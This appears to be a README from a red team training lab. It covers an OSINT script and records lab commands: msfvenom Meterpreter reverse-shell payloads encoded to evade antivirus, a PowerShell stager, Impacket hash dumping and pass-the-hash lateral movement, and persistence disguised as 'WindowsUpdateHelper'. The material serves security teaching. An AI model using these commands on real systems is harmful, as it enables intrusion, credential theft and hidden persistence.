# Scripts — Week 3

This folder contains the Python scripts developed during the Week 3 red team lab.

## osint_recon.py

**Purpose:** Automated OSINT and passive reconnaissance  
**ATT&CK:** T1595, T1590, T1593

Performs subdomain enumeration via DNS brute-force, DNS record queries (A, MX, NS, TXT),
WHOIS lookups, and Shodan API queries. Outputs results to a structured JSON report.

```bash
# Install dependencies
pip3 install requests shodan python-whois dnspython

# Basic usage
python3 osint_recon.py --target example.com

# With Shodan API key
python3 osint_recon.py --target example.com --shodan-key YOUR_KEY

# Custom output path
python3 osint_recon.py --target example.com --output recon_results.json
```

---

## Payload Obfuscation — Concepts (ATT&CK: T1027)

During the lab, payload evasion was tested using the following **msfvenom** commands
(documented here for reference — run only in isolated lab VMs):

```bash
# Baseline payload — no encoding (high detection rate)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<LAB_IP> LPORT=4444 -f exe -o baseline.exe

# Encoded with shikata_ga_nai — 5 iterations
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=<LAB_IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f exe -o encoded.exe

# PowerShell stager
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=<LAB_IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 \
  -f ps1 > stager.ps1
```

---

## Lateral Movement — Concepts (ATT&CK: T1550.002, T1021.002)

Pass-the-Hash lateral movement was performed using **Impacket** (pre-installed on Kali):

```bash
# Dump SAM/LSA hashes from compromised host
python3 /usr/share/doc/python3-impacket/examples/secretsdump.py \
  WORKGROUP/Administrator:'password'@<TARGET_IP>

# Pass-the-Hash pivot with psexec
python3 /usr/share/doc/python3-impacket/examples/psexec.py \
  -hashes aad3b435b51404eeaad3b435b51404ee:<NTLM_HASH> \
  Administrator@<TARGET_IP>
```

**Prerequisite:** Target must be Metasploitable or a lab VM you own.  
**Reference:** [Impacket GitHub](https://github.com/fortra/impacket)

---

## Persistence — Concepts (ATT&CK: T1053.005, T1547.001)

Persistence mechanisms were documented during the lab engagement:

```powershell
# Scheduled task (run in meterpreter shell on target)
schtasks /Create /F /SC DAILY /ST 02:00 /TN WindowsUpdateHelper \
  /TR "C:\Windows\Temp\update.exe" /RU SYSTEM

# Registry Run key
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v WindowsUpdateHelper /t REG_SZ \
  /d "C:\Windows\Temp\update.exe" /f
```

---

## Learning Resources

| Topic | Resource |
|-------|---------|
| Metasploit | [docs.metasploit.com](https://docs.metasploit.com/) |
| Impacket | [github.com/fortra/impacket](https://github.com/fortra/impacket) |
| GTFOBins | [gtfobins.github.io](https://gtfobins.github.io) |
| MITRE ATT&CK | [attack.mitre.org](https://attack.mitre.org) |
| HackTheBox | [hackthebox.com](https://www.hackthebox.com) |
| TryHackMe | [tryhackme.com](https://www.tryhackme.com) |
